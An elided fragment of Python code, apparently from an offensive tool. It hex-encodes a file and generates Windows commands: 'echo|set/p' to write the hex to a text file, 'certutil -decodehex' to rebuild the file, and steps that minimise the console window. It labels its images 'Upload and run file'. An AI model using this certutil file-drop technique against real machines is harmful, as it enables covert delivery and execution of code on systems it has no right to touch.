...
with open(MyFile, "rb") as f:
    FileTextArray = (f.read(MyFileSize)).hex()

# Add commands and control operations to minimize the command-line window and output the first part of the file
TextArray = (TxString +
...
FollowingHeaders = 'echo|set/p="'

# Define the commands to be executed after the file dump
FinalString = ('certutil -f -decodehex temp.txt '+MyFile+Enter+ # Hex decode the text file with cerutil
               ...
               'exit'+Enter # Exit the command line
               )
...
while Iteration < LastIteration:
    ...
    draw.text((0, 0), ControlCodes + ':' + 'Upload and run file - Hex encoding ' + str(Iteration),fill = 'black', font = font)
